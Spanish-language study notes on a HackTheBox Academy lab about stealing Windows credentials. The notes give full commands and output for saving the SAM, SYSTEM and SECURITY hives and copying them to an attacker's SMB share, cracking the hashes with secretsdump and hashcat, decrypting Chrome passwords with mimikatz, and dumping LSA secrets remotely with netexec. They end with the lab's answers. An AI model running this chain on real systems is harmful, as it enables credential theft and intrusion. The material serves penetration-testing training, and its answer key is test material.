Con acceso administrativo a un sistema Windows, podemos intentar volcar rápidamente los archivos asociados a la base de datos SAM, transferirlos a nuestro host de ataque y comenzar a descifrar los hashes sin conexión. 
Realizar este proceso sin conexión nos permite continuar nuestros ataques sin tener que mantener una sesión activa con el objetivo.

---

## Registry hives
Hay tres subárboles de registro que podemos copiar si tenemos acceso administrativo local a un sistema de destino. Cada uno cumple una función específica para volcar y descifrar hashes de contraseñas. La siguiente tabla ofrece una breve descripción de cada uno:

- HKLM\SAM: Contiene hashes de contraseñas para cuentas de usuario locales. Estos hashes se pueden extraer y descifrar para revelar contraseñas en texto plano.
- HKLM\SYSTEM: Almacena la clave de arranque del sistema, que se utiliza para cifrar la base de datos SAM. Esta clave es necesaria para descifrar los hashes.
- HKLM\SECURITY: Contiene información confidencial utilizada por la Autoridad de Seguridad Local (LSA), incluyendo credenciales de dominio en caché (DCC2), contraseñas en texto plano, claves DPAPI y más.

Podemos hacer una copia de seguridad de todos estos registros con la utilidad *reg.exe*.

---
## Usando reg.exe para copiar subárboles de registro.
Lanzando cmd.exe con privilegios de adminsitrador, podemos usar el ejecutable "reg.exe" para guardar copias de los subárboles de registro.
Lo haremos lanzando el siguiente comando:
``` 
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

Si solo nos interesa volcar los hashes de los usuarios locales, solo necesitamos HKLM\SAM y HKLM\SYSTEM. Sin embargo, suele ser útil guardar también HKLM\SECURITY, ya que puede contener credenciales de usuario de dominio en caché en sistemas unidos al dominio, junto con otros datos valiosos. Una vez que estos subárboles se guardan sin conexión, podemos usar varios métodos para transferirlos a nuestro host de ataque. En este caso, usaremos smbserver de Impacket junto con algunos comandos CMD básicos para mover las copias de los subárboles a un recurso compartido alojado en el equipo del atacante.

---
### Creando un share con SMBSERVER
Para crear el recurso compartido, simplemente ejecutamos:
*smbserver.py -smb2support*, especificamos un nombre para el recurso compartido (p. ej., CompData) y apuntamos al directorio local en nuestro host de ataque donde se almacenarán las copias de la colmena (p. ej., /home/ltnbob/Documents). 
El indicador -smb2support garantiza la compatibilidad con versiones más recientes de SMB. Si no lo incluimos, es posible que los sistemas Windows más recientes no puedan conectarse al recurso compartido, ya que SMBv1 está deshabilitado por defecto debido a numerosas vulnerabilidades graves y exploits disponibles públicamente.

```
Polika4RM@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Una vez que el recurso compartido se esté ejecutando en nuestro host de ataque, podemos usar el comando de "move" en el destino de Windows para transferir las copias de la colmena al recurso compartido:
```
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```
Esto **mueve** el archivo `sam.save` desde el equipo Windows hacia una **carpeta compartida en red (SMB)** ubicada en el host `10.10.15.16`, dentro del recurso compartido `CompData`.


Comprobamos que estos se han guardado correctamente, con:
```
Polika4RM@htb[/htb]$ ls

sam.save  security.save  system.save
```

Esto indica que **la máquina Linux (10.10.15.16)** tiene montado (o exportado) ese recurso compartido SMB, y por eso ahora puede ver los tres archivos.
Es decir:
- El Windows los envió por red a `\\10.10.15.16\CompData`
- La Linux es **10.10.15.16**
- En ella, el recurso compartido `CompData` apunta (por ejemplo) a `/htb/`
- Por eso al listar `/htb`, aparecen los ficheros

---
## Dumping con with secretsdump

Una herramienta especialmente útil para volcar hashes sin conexión es secretsdump de Impacket. Impacket está incluido en la mayoría de las distribuciones modernas para pruebas de penetración. Para comprobar si está instalado en un sistema Linux, podemos usar el comando locate:
```
Polika4RM@htb[/htb]$ locate secretsdump 
```

Usar secretsdump es sencillo. Simplemente ejecutamos el script con Python y especificamos cada uno de los archivos de Hive recuperados del host de destino:

```shell-session
Polika4RM@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up... 
```

Aquí vemos que secretsdump volcó correctamente los hashes SAM locales, junto con los datos de hklm\security, incluyendo la información de inicio de sesión del dominio en caché y los secretos LSA, como las claves de máquina y usuario para DPAPI.

Observe que el primer paso que realiza secretsdump es recuperar la clave de arranque del sistema antes de proceder a volcar los hashes SAM locales. Esto es necesario porque la clave de arranque se utiliza para cifrar y descifrar la base de datos SAM. Sin ella, los hashes no se pueden descifrar; por eso, como se mencionó anteriormente, es crucial tener copias de las secciones de registro relevantes.

Observamos la siguiente línea:
```
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

Esto nos indica cómo interpretar la salida y qué hashes podemos intentar descifrar. La mayoría de los sistemas operativos Windows modernos almacenan las contraseñas como hashes NT. Los sistemas más antiguos (como los anteriores a Windows Vista y Windows Server 2008) pueden almacenar las contraseñas como hashes LM, que son más débiles y fáciles de descifrar. Por lo tanto, los hashes LM son útiles si el objetivo ejecuta una versión anterior de Windows.

Con esto en mente, podemos copiar los hashes NT asociados a cada cuenta de usuario en un archivo de texto y comenzar a descifrar contraseñas. Es útil identificar qué hash corresponde a cada usuario para realizar un seguimiento de los resultados.

---
## Cracking hashes with Hashcat

Una vez que tengamos los hashes, podemos empezar a descifrarlos con Hashcat. 
Hashcat admite una amplia gama de algoritmos de hash, como se describe en su sitio web. En este módulo, nos centraremos en el uso de Hashcat para casos de uso específicos. Este enfoque le ayudará a comprender cómo y cuándo usar Hashcat eficazmente, y cómo consultar su documentación para identificar el modo y las opciones adecuados según el tipo de hashes que haya capturado.

Como se mencionó anteriormente, podemos rellenar un archivo de texto con los hashes de NT que pudimos volcar:
```shell-session
Polika4RM@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```
---
### Running Hashcat against NT hashes
Ahora que los hashes NT están en nuestro archivo de texto (hashestocrack.txt), podemos usar Hashcat para descifrarlos.

Hashcat admite muchos modos diferentes, y la selección del correcto depende en gran medida del tipo de ataque y del tipo de hash específico que queramos descifrar. Este módulo no abarca todos los modos disponibles, por lo que nos centraremos en el uso de la opción -m para especificar el tipo de hash 1000, que corresponde a los hashes NT (también conocidos como hashes basados ​​en NTLM). Para obtener una lista completa de los tipos de hashes compatibles y sus números de modo asociados, podemos consultar la página wiki de Hashcat o la página del manual:
>https://hashcat.net/wiki/doku.php?id=example_hashes

```shell-session
Polika4RM@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          <---------
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         <---------
184ecdda8cf1dd238d438c4aea4d560d:adrian          <---------
31d6cfe0d16ae931b73c59d7e0c089c0:                <---------
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -> whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021
```

El resultado muestra que Hashcat logró descifrar tres de los hashes:
```
f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
```
Disponer de estas contraseñas puede ser útil de muchas maneras. Por ejemplo, podríamos intentar usar las credenciales descifradas para acceder a otros sistemas de la red. Es muy común que los usuarios reutilicen contraseñas en diferentes cuentas, tanto profesionales como personales. Comprender y aplicar esta técnica puede ser valioso durante las evaluaciones. Nos resultará útil cada vez que encontremos un sistema Windows vulnerable y obtengamos permisos administrativos para volcar la base de datos SAM.

Tenga en cuenta que esta es una técnica bien conocida y que los administradores pueden haber implementado medidas de seguridad para detectarla o prevenirla. Varias estrategias de detección y mitigación están documentadas en el marco MITRE ATT&CK.

---
## DCC2 hashes
Como se mencionó anteriormente, hklm\security contiene información de inicio de sesión del dominio en caché, específicamente en forma de hashes DCC2. Estos son copias locales y en hashes de las credenciales de red. Un ejemplo es:
```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```
Este tipo de hash es mucho más difícil de descifrar que un hash NT, ya que utiliza PBKDF2. Además, no se puede utilizar para el movimiento lateral con técnicas como Pass-the-Hash (que abordaremos más adelante). El modo Hashcat para descifrar hashes DCC2 es 2100.

```shell-session
Polika4RM@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

<SNIP>

$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 2100 (Domain Cached Credentials 2 (DCC2), MS Cache 2)
Hash.Target......: $DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
Time.Started.....: Tue Apr 22 09:12:53 2025 (27 secs)
Time.Estimated...: Tue Apr 22 09:13:20 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5536 H/s (8.70ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 149504/14344385 (1.04%)
Rejected.........: 0/149504 (0.00%)
Restore.Point....: 148992/14344385 (1.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9216-10239
Candidate.Engine.: Device Generator
Candidates.#1....: ilovelloyd -> gerber1
Hardware.Mon.#1..: Util: 95%

Started: Tue Apr 22 09:12:33 2025
Stopped: Tue Apr 22 09:13:22 2025
```
Nótese que la velocidad de descifrado es de 5536 H/s. En la misma máquina, los hashes NTLM se pueden descifrar a 4605,4 kH/s. Esto significa que descifrar hashes DCC2 es aproximadamente 800 veces más lento. Las cifras exactas dependerán en gran medida del hardware disponible, por supuesto, pero la conclusión es que las contraseñas seguras suelen ser indescifrables dentro de los plazos típicos de las pruebas de penetración.

---
## DPAPI
Además de los hashes DCC2, vimos anteriormente que las claves de máquina y usuario para DPAPI también se extrajeron de hklm\security. La Interfaz de Programación de Aplicaciones de Protección de Datos (DPAPI) es un conjunto de API en sistemas operativos Windows que se utilizan para cifrar y descifrar blobs de datos por usuario. Estos blobs son utilizados por diversas funciones del sistema operativo Windows y aplicaciones de terceros. A continuación, se muestran algunos ejemplos de aplicaciones que utilizan DPAPI y cómo lo hacen:
  
| Applications                | Use of DPAPI                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------ |
| `Internet Explorer`         | Datos de autocompletado del formulario de contraseña (nombre de usuario y contraseña para sitios guardados). |
| `Google Chrome`             | Datos de autocompletado del formulario de contraseña (nombre de usuario y contraseña para sitios guardados). |
| `Outlook`                   | Contraseñas de cuentas de correo electrónico.                                                                |
| `Remote Desktop Connection` | Credenciales guardadas para conexiones a equipos remotos.                                                    |
| `Credential Manager`        | Credenciales guardadas para acceder a recursos compartidos, conectarse a redes inalámbricas, VPN y más.      |

Las credenciales cifradas con DPAPI se pueden descifrar manualmente con herramientas como dpapi de Impacket, mimikatz o de forma remota con DonPAPI.

```cmd-session
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
```

---
## Remote dumping & LSA secrets considerations
Contexto:
- LSA secrets: son secretos guardados por el Local Security Authority (LSA) de Windows. En esa área se almacenan cosas sensibles como claves DPAPI, contraseñas de tareas programadas, credenciales de servicios, secretos de cuentas de sistema, claves usadas para proteger cached logons, etc.
- SAM (Security Accounts Manager): contiene las cuentas locales del equipo y sus hashes de contraseña (NTLM/LM). No son las contraseñas en claro, sino los hashes que permiten autenticar o usarse para ataques (p. ej. pass-the-hash).
- Con credenciales de administrador local (o de una cuenta con suficientes privilegios) se pueden extraer ambos de forma remota vía SMB/RPC.


Con acceso a credenciales con privilegios de administrador local, también es posible acceder a secretos LSA a través de la red. Esto nos permite extraer credenciales de servicios en ejecución, tareas programadas o aplicaciones que almacenan contraseñas mediante secretos LSA.
#### Dumping LSA secrets remotamente

Por una lado, estan los --lsa, que son contraseñas en texto plano:
LSA secrets (secretos de LSA) son datos que el servicio LSA (Local Security Authority) guarda en el sistema. Pueden ser contraseñas en texto plano, tokens, claves y otras credenciales que el sistema o aplicaciones necesitan



```shell-session
Polika4RM@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```

#### Dumping SAM Remotely

Y por otro lado, estan los HASHES --sam, que son HASHES de contraseñas:
```shell-session
Polika4RM@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```

--- 
**1. Where is the SAM database located in the Windows registry? (Format: ****\***)
Pregunta de teoría con respuesta: HKLM\SAM.

**2.  Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.
RDP to 10.129.202.137 (ACADEMY-PWATTACKS-WIN10SAM) with user "Bob" and password "HTB_@cademy_stdnt!"

 Me conecto al RDP con:
 ```
 xfreerdp /v:10.129.202.137 /u:Bob /p:'HTB_@cademy_stdnt!'
 ```

Abro el *cmd* como administrador y guardo las copias de los subárboles de registro con:
```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

Desde la máquina atacante, creo un SHARE para recibir dichos archivos:
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
10/09/2025 01:44:50 AM: INFO: Config file parsed
```

Desde la máquina atacante Linux, consulto que IP tengo con *ip a*:
10.10.14.107
Desde la máquina Windows a vulnerar, vuelco dichos documentos en tales recursos compartidos con el comando:
```
C:\> move sam.save \\10.10.14.107\CompData
        Access is denied
        0 file(s) moved.
```

Me está dando error. Vamos a probar a hacerlo con la sección de FILE TRANSFERS de este bloc de notas de obsidian.

Desde linux (atacante), ejecuto:
```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Me aseguro que la carpeta /tmp/smbshare se haya creado, de lo contrario, ejecuto:
```
sudo mkdir -p /tmp/smbshare
sudo chmod 777 /tmp/smbshare
ls -ld /tmp/smbshare
```

En windows (víctima) abro el *cmd* como **administrador** y guardo las copias de los subárboles de registro con:
```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

```
net use N: \\10.10.14.107\share /user:test test
copy C:\sam.save N:\
```

Después, desde la máquina atacante Linux, accediendo a:
```
cd /tmp/smbshare
```
Encontraré dichos archivos enviados.

Ahora, extraeré los HASHES con el comando:
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Obteniendo:
```
[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)

```

La parte final de estos hashes las guardo en un archivo llamado "hashestocrack.txt". Como nos pide el de ITbackdoor, tan solo copiamos dicho hash:
```
cat hashestocrack.txt 
c02478537b9727d391bc80011c2e2321
```

Ejecuto:
```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt.gz 
```

Y me devuelve que el Hash es: 
```
c02478537b9727d391bc80011c2e2321:matrix                   
```

Respuesta: matrix

**3. Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

```
netexec smb 10.129.36.32 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
SMB         10.129.36.32    445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.36.32    445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.36.32    445    FRONTDESK01      [+] Dumping LSA secrets
SMB         10.129.36.32    445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.36.32    445    FRONTDESK01      NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.36.32    445    FRONTDESK01      frontdesk:Password123
SMB         10.129.36.32    445    FRONTDESK01      [+] Dumped 3 LSA secrets to /home/htb-ac-1876550/.nxc/logs/FRONTDESK01_10.129.36.32_2025-10-09_042926.secrets and /home/htb-ac-1876550/.nxc/logs/FRONTDESK01_10.129.36.32_2025-10-09_042926.cached
```

Y la solución es "frontdesk:Password123"

